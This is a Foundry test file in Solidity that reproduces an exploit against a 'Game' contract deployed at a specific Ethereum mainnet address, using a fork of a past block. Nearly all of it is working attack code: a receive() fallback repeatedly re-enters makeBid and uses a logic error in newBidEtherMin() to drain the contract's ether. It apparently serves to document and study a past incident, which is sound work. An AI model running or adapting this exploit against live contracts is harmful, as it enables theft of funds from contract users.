// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "./IGame.sol";

IGame constant Game = IGame(
    payable(0x52d69c67536f55EfEfe02941868e5e762538dBD6)
);

contract GameTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19213946);
        vm.label(address(Game), "Game");

        // Start with 0.6 Ether balance
        deal(address(this), 0.6 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("ETH balance before", address(this).balance, 18);

        // Following amount will be returned multiple times in receive() function when exploiter make the bad bid
        Game.makeBid{value: 0.5 ether}();

        // uint256 bidEther = Game.bidEther();
        // uint256 newBidEtherMin = Game.newBidEtherMin();
        // print("bidEther", bidEther, 18);
        // print("newBidEtherMin", newBidEtherMin, 18);

        makeBadBid();

        print("ETH balance after", address(this).balance, 18);
    }

    receive() external payable {
        if (address(Game).balance > 0.5 ether) {
            makeBadBid();
        } else {
            return;
        }
    }

    function makeBadBid() internal {
        // newBidEtherMin() has logic error and thanks to this exploiter can bypass the require statement in makeBid()
        // require(msg.value > newBidEtherMin(), "bid is too low");
        uint256 badBid = Game.newBidEtherMin() + 1; // +1 because "bid is too low"
        Game.makeBid{value: badBid}();
    }
}
